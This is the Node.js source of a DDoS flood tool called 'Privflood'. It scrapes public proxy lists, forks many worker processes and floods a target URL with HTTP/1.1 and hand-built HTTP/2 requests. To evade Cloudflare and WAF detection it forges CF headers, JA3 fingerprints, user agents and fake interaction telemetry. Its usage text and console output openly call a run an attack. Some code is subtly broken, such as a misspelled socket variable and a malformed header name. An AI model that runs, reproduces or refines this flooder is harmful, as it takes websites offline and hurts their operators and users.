const http2 = require('http2');
const http = require('http');
const net = require('net');
const fs = require('fs');
const setTitle = require('node-bash-title');
const cluster = require('cluster');
const tls = require('tls');
const HPACK = require('hpack');
const crypto = require('crypto');
const { exec } = require('child_process');
const httpx = require('axios');

// Utility functions
const randomString = (length = 10) => {
    return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
};

const randomIP = () => {
    return Array.from({length: 4}, () => Math.floor(Math.random() * 256)).join('.');
};

const shuffleArray = (array) => {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
};

const generateJA3Fingerprint = (browser) => {
    const ja3Samples = {
        Chrome: [
            '771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21,29-23-24,0',
            '771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24-25-256-257,0'
        ],
        Firefox: [
            '771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-13-35-16-5-51-18-45-43-27-21,29-23-24-25,0',
            '771,49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-47-53-10,0-23-65281-10-11-35-16-5-34-51-43-13-45-28-21,29-23-24-25,0'
        ],
        Safari: [
            '771,4865-4866-4867-49195-49196-49200-49199-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21,29-23-24,0',
            '771,4865-4866-4867-49195-49196-49200-49199-52393-52392-49171-49172-47-53,0-23-65281-10-11-13-16-5-34-51-43-45-28,29-23-24,0'
        ],
        Edge: [
            '771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21,29-23-24,0',
            '771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24-25-256-257,0'
        ],
        Opera: [
            '771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24-25-256-257,0',
            '771,4865-4866-4867-49195-49196-49200-49199-52393-52392-49171-49172-47-53,0-23-65281-10-11-13-16-5-34-51-43-45-28,29-23-24,0'
        ]
    };
    return ja3Samples[browser][Math.floor(Math.random() * ja3Samples[browser].length)];
};

const randomizeTLSCiphers = () => {
    const ciphers = [
        'TLS_AES_128_GCM_SHA256',
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-RSA-AES256-GCM-SHA384',
        'ECDHE-ECDSA-AES128-GCM-SHA256',
        'ECDHE-ECDSA-AES256-GCM-SHA384',
        'ECDHE-RSA-CHACHA20-POLY1305',
        'ECDHE-ECDSA-CHACHA20-POLY1305'
    ];
    return shuffleArray(ciphers).join(':');
};

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError', 'DeprecationWarning'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT', 'DEP0123'];

const browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
const devices = ['Windows', 'Macintosh', 'Linux', 'Android', 'iPhone', 'iPad'];
const versions = {
    Chrome: ['110.0.0.0', '111.0.0.0', '112.0.0.0', '113.0.0.0', '114.0.0.0', '115.0.0.0', '116.0.0.0', '117.0.0.0', '118.0.0.0', '119.0.0.0', '120.0.0.0'],
    Firefox: ['110.0', '111.0', '112.0', '113.0', '114.0', '115.0', '116.0', '117.0', '118.0', '119.0', '120.0'],
    Safari: ['15.0', '15.1', '15.2', '15.3', '15.4', '15.5', '15.6', '16.0', '16.1', '16.2', '16.3'],
    Edge: ['110.0', '111.0', '112.0', '113.0', '114.0', '115.0', '116.0', '117.0', '118.0', '119.0', '120.0'],
    Opera: ['95', '96', '97', '98', '99', '100', '101', '102', '103', '104', '105']
};

const cookieNames = ['session', 'user', 'token', 'id', 'auth', 'pref', 'theme', 'lang', 'sid', 'csrf', 'tracking'];
const cookieValues = ['abc123', 'xyz789', 'def456', 'temp', 'guest', 'user', 'admin', 'secure', 'data'];

function generateRandomCookie() {
    const name = cookieNames[Math.floor(Math.random() * cookieNames.length)];
    const value = cookieValues[Math.floor(Math.random() * cookieValues.length)] + randomString(8);
    return `${name}=${value}`;
}

const args = process.argv.slice(2);
const options = {
    cookies: args.includes('-c'),
    headfull: args.includes('-h'),
    human: args.includes('-human'),
    version: args.includes('-v') ? args[args.indexOf('-v') + 1] : '2',
    cache: args.includes('-ch') ? args[args.indexOf('-ch') + 1] === 'true' : true,
    debug: !args.includes('-s')
};

const proxyList = [
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
    'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'http://worm.rip/http.txt',
    'https://proxyspace.pro/http.txt',
    'https://proxy-spider.com/api/proxies.example.txt1',
    'http://193.200.78.26:8000/http?key=free'
];

async function scrapeProxies() {
    const file = "proxy.txt";
    try {
        if (fs.existsSync(file)) {
            fs.unlinkSync(file);
            if (options.debug) console.log(`File ${file} removed!\nRefreshing proxies...\n`);
        }
        for (const proxy of proxyList) {
            try {
                const response = await httpx.get(proxy);
                fs.appendFileSync(file, response.data);
            } catch (err) {
                continue;
            }
        }
        const total = fs.readFileSync(file, 'utf-8').split('\n').length;
        if (options.debug) console.log(`( ${total} ) Proxies scraped/refreshed.`);
    } catch (err) {
        if (options.debug) console.log('Error scraping proxies');
        process.exit(1);
    }
}

function generateUserAgent(browser) {
    const device = devices[Math.floor(Math.random() * devices.length)];
    const version = versions[browser][Math.floor(Math.random() * versions[browser].length)];
    let ua = '';
    if (device === 'Android') {
        ua = `Mozilla/5.0 (Linux; Android ${Math.floor(Math.random() * 4) + 10}; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Mobile Safari/537.36`;
    } else if (device === 'iPhone' || device === 'iPad') {
        ua = `Mozilla/5.0 (${device}; CPU OS ${Math.floor(Math.random() * 4) + 14}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${versions['Safari'][Math.floor(Math.random() * versions['Safari'].length)]} Mobile/15E148 Safari/604.1`;
    } else {
        switch (browser) {
            case 'Chrome':
                ua = `Mozilla/5.0 (${device === 'Windows' ? 'Windows NT 10.0; Win64; x64' : device === 'Macintosh' ? 'Macintosh; Intel Mac OS X 10_15_7' : 'X11; Linux x86_64'}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36`;
                break;
            case 'Firefox':
                ua = `Mozilla/5.0 (${device === 'Windows' ? 'Windows NT 10.0; Win64; x64' : device === 'Macintosh' ? 'Macintosh; Intel Mac OS X 10.15' : 'X11; Linux x86_64'}; rv:${version}) Gecko/20100101 Firefox/${version}`;
                break;
            case 'Safari':
                ua = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version} Safari/605.1.15`;
                break;
            case 'Edge':
                ua = `Mozilla/5.0 (${device === 'Windows' ? 'Windows NT 10.0; Win64; x64' : device === 'Macintosh' ? 'Macintosh; Intel Mac OS X 10_15_7' : 'X11; Linux x86_64'}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36 Edg/${version}`;
                break;
            case 'Opera':
                ua = `Mozilla/5.0 (${device === 'Windows' ? 'Windows NT 10.0; Win64; x64' : device === 'Macintosh' ? 'Macintosh; Intel Mac OS X 10_15_7' : 'X11; Linux x86_64'}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36 OPR/${version}`;
                break;
        }
    }
    return ua;
}

const wafBypassTechniques = {
    advancedCloudflareBypass: (requestOptions) => {
        requestOptions.headers['CF-IPCountry'] = ['US', 'GB', 'CA', 'AU', 'DE', 'FR'][Math.floor(Math.random() * 6)];
        requestOptions.headers['CF-Visitor'] = JSON.stringify({ "scheme": "https" });
        requestOptions.headers['CF-RAY'] = `${randomString(16).toLowerCase()}-${['EWR', 'DFW', 'LAX', 'LHR', 'FRA'][Math.floor(Math.random() * 5)]}`;
        requestOptions.headers['CF-Connecting-IP'] = randomIP();
        requestOptions.headers['X-Canvas-Fingerprint'] = crypto.randomBytes(16).toString('hex');
        requestOptions.headers['X-WebGL-Fingerprint'] = crypto.randomBytes(22).toString('hex');
        requestOptions.headers['X-JS-Engine'] = ['V8', 'SpiderMonkey', 'JavaScriptCore'][Math.floor(Math.random() * 3)];
        const mouseData = {
            moves: Math.floor(Math.random() * 100) + 50,
            clicks: Math.floor(Math.random() * 8) + 1,
            elements: ['nav', 'button', 'div.content', 'a.link', 'input'][Math.floor(Math.random() * 5)]
        };
        requestOptions.headers['X-User-Interaction'] = JSON.stringify(mouseData);
        const navTiming = {
            fetchStart: Date.now() - Math.floor(Math.random() * 1000) - 2000,
            domLoading: Date.now() - Math.floor(Math.random() * 800) - 1000,
            domInteractive: Date.now() - Math.floor(Math.random() * 500) - 500,
            domComplete: Date.now() - Math.floor(Math.random() * 300)
        };
        requestOptions.headers['X-Nav-Timing'] = JSON.stringify(navTiming);
        requestOptions.headers['X-TLS-Fingerprint'] = generateJA3Fingerprint(requestOptions.browser);
    },
    neuralNetworkWafBypass: (requestOptions) => {
        const timeOnSite = Math.floor(Math.random() * 600) + 60;
        const pagesViewed = Math.floor(Math.random() * 5) + 1;
        const avgTimePerPage = Math.floor(timeOnSite / pagesViewed);
        requestOptions.headers['X-Session-Depth'] = pagesViewed.toString();
        requestOptions.headers['X-Session-Duration'] = timeOnSite.toString();
        const storageSignature = {
            localStorage: Math.floor(Math.random() * 30) + 5,
            sessionStorage: Math.floor(Math.random() * 10) + 2,
            cookies: Math.floor(Math.random() * 15) + 10
        };
        requestOptions.headers['X-Browser-Storage'] = JSON.stringify(storageSignature);
        const inputPatterns = {
            typingSpeed: Math.floor(Math.random() * 300) + 150,
            correctionRate: Math.floor(Math.random() * 10),
            formCompletionTime: Math.floor(Math.random() * 30) + 15
        };
        requestOptions.headers['X-Input-Metrics'] = JSON.stringify(inputPatterns);
        const pointerSignature = {
            speed: Math.floor(Math.random() * 100) + 50,
            acceleration: Math.floor(Math.random() * 20) + 5,
            direction_changes: Math.floor(Math.random() * 50) + 20
        };
        requestOptions.headers['X-Pointer-Metrics'] = JSON.stringify(pointerSignature);
    }
};

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);
process.emitWarning = function() {};

process
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

if (process.argv[2] === 'scrape') {
    console.clear();
    scrapeProxies();
    return;
}

if (process.argv.length < 7) {
    console.clear();
    console.log(`
Privflood Scripts :

Usage:
node privflood.js <target> <duration> <proxies.txt> <threads> <rate> [options]

Options:
-c: Enable random cookies
-h: Enable headfull requests
-human: Enable human-like behavior for WAF bypass
-v <1/2>: Choose HTTP version (1 or 2)
-ch <true/false>: Enable/disable cache
-s: Disable debug output

Example:
node privflood.js https://target.com 120 proxies.txt 100 64 -c -h
`);
    process.exit(1);
}

const target = process.argv[2];
const duration = process.argv[3];
const proxyFile = process.argv[4];
const threads = parseInt(process.argv[5]);
const rate = parseInt(process.argv[6]);

let proxies = [];
let proxy = [];

try {
    proxies = fs.readFileSync(proxyFile, 'utf-8').toString().split('\n').filter(p => p.length > 0);
    proxy = proxies;
} catch (e) {
    if (options.debug) console.log('Error loading proxy file');
    process.exit(1);
}

let stats = {
    requests: 0,
    goaway: 0,
    success: 0,
    forbidden: 0,
    errors: 0
};

let statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const url = new URL(target);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUint8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset != length) {
            return null;
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

function buildRequest() {
    const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'];
    const method = methods[Math.floor(Math.random() * methods.length)];
    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    const userAgent = generateUserAgent(browser);

    let requestOptions = {
        headers: {},
        browser
    };

    if (options.human) {
        wafBypassTechniques.advancedCloudflareBypass(requestOptions);
        wafBypassTechniques.neuralNetworkWafBypass(requestOptions);
    }

    let headers = `${method} ${url.pathname} HTTP/1.1\r\n` +
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n' +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        'Accept-Language: en-US,en;q=0.9\r\n' +
        `Cache-Control: ${options.cache ? 'max-age=0' : 'no-cache'}\r\n` +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n`;

    if (options.cookies) {
        headers += `Cookie: ${generateRandomCookie()}; ${generateRandomCookie()}; ${generateRandomCookie()}\r\n`;
    }

    if (options.headfull || options.human) {
        headers += 'Sec-Fetch-Dest: document\r\n' +
            'Sec-Fetch-Mode: navigate\r\n' +
            'Sec-Fetch-Site: none\r\n' +
            'Sec-Fetch-User: ?1\r\n' +
            'Upgrade-Insecure-Requests: 1\r\n' +
            `User-Agent: ${userAgent}\r\n` +
            'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"\r\n' +
            'sec-ch-ua-mobile: ?0\r\n' +
            'sec-ch-ua-platform: "Windows"\r\n';
    } else {
        headers += `User-Agent: ${userAgent}\r\n`;
    }

    for (const [key, value] of Object.entries(requestOptions.headers)) {
        headers += `${key}: ${value}\r\n`;
    }

    headers += '\r\n';

    return Buffer.from(headers, 'binary');
}

const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()));

function go() {
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');

    if (!proxyPort || isNaN(proxyPort)) {
        go();
        return;
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            const tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: options.version === '1' ? ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.hostname,
                ciphers: randomizeTLSCiphers(),
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
                secure: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1' || options.version === '1') {
                    function doWrite() {
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                stats.requests++;
                                setTimeout(doWrite, options.human ? Math.random() * 200 + 50 : 1000 / rate);
                            } else {
                                stats.errors++;
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        });
                    }
                    doWrite();
                    tlsSockt.on('error', () => {
                        stats.errors++;
                        tlsSocket.end(() => tlsSocket.destroy());
                    });
                    return;
                }

                let streamId = 1;
                let data = Buffer.alloc(0);
                const hpack = new HPACK();
                hpack.setTableSize(4096);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_header],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_table]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }
                            if (frame.type == 7) {
                                stats.goaway++;
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                            if (frame.type == 9) {
                                stats.success++;
                            }
                        } else {
                            break;
                        }
                    }
                });

                tlsSocket.write(Buffer.concat(frames));

                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return;
                    }

                    const requests = [];
                    const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'];
                    const method = methods[Math.floor(Math.random() * methods.length)];
                    const browser = browsers[Math.floor(Math.random() * browsers.length)];
                    const userAgent = generateUserAgent(browser);

                    let requestOptions = {
                        headers: {},
                        browser
                    };

                    if (options.human) {
                        wafBypassTechniques.advancedCloudflareBypass(requestOptions);
                        wafBypassTechniques.neuralNetworkWafBypass(requestOptions);
                    }

                    let headers = [
                        [':method', method],
                        [':authority', url.hostname],
                        [':scheme', 'https'],
                        [':path', url.pathname],
                        ['user-agent', userAgent],
                        ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'],
                        ['accept-encoding', 'gzip, deflate, br'],
                        ['accept-language', 'en-US,en;q=0.9'],
                        ['cache-control', options.cache ? 'max-age=0' : 'no-cache']
                    ];

                    if (options.cookies) {
                        headers.push(['cookie', `${generateRandomCookie()}; ${generateRandomCookie()}; ${generateRandomCookie()}`]);
                    }

                    if (options.headfull || options.human) {
                        headers = headers.concat([
                            ['sec-ch-ua', `"${browser}";v="${versions[browser][0]}"`],
                            ['sec-ch-ua-mobile', devices.includes('Android') || devices.includes('iPhone') || devices.includes('iPad') ? '?1' : '?0'],
                            ['ec-ch-ua-platform', devices[Math.floor(Math.random() * devices.length)]],
                            ['sec-fetch-dest', 'document'],
                            ['sec-fetch-mode', 'navigate'],
                            ['sec-fetch-site', 'none'],
                            ['sec-fetch-user', '?1'],
                            ['upgrade-insecure-requests', '1']
                        ]);
                    }

                    for (const [key, value] of Object.entries(requestOptions.headers)) {
                        headers.push([key.toLowerCase(), value]);
                    }

                    const packed = Buffer.concat([
                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                        hpack.encode(headers)
                    ]);

                    requests.push(encodeFrame(streamId, 1, packed, 0x25));
                    streamId += 2;
                    stats.requests++;

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            setTimeout(doWrite, options.human ? Math.random() * 200 + 50 : 1000 / rate);
                        } else {
                            stats.errors++;
                            tlsSocket.end(() => tlsSocket.destroy());
                        }
                    });
                }

                doWrite();
            });
        });

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });

    netSocket.on('error', () => {
        stats.errors++;
        netSocket.destroy();
        go();
    });
}

if (cluster.isMaster) {
    console.clear();
    // Pink color codes are not directly supported by `colors` module without specific configuration.
    // For a pure text output with "pink" styling without external `colors` module,
    // we would need to manually concatenate string literals.
    // Given the previous instruction to remove `colors` module for simple design,
    // we'll stick to plain text for this output, using `@privflood` as the main identifier.

    console.log(`
Privflood Attack Initiated

Target: ${target}
Duration: ${duration}s
Proxies: ${proxyFile}
Threads: ${threads}
Rate: ${rate}/s

  Options Enabled:
  Random Cookies: ${options.cookies ? 'Enabled' : 'Disabled'}
  Headfull Requests: ${options.headfull ? 'Enabled' : 'Disabled'}
  Human-like Behavior: ${options.human ? 'Enabled' : 'Disabled'}
  HTTP Version: ${options.version === '1' ? 'HTTP/1.1' : 'HTTP/2'}
  Cache: ${options.cache ? 'Enabled' : 'Disabled'}
--------------------------------------------------
`);

    let totalRequests = 0;
    setInterval(() => {
        setTitle(`@privflood | Sent: ${stats.requests} | Success: ${stats.success} | Errors: ${stats.errors} | Goaways: ${stats.goaway} | ${options.version === '1' ? 'HTTP/1.1' : 'HTTP/2'} RushAway`);
        totalRequests += rate * threads;
    }, 1000);

    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        console.log('\nAttack finished');
        process.exit(0);
    }, duration * 1000);
} else {
    setInterval(go, options.human ? Math.random() * 200 + 50 : 1000 / rate);
}
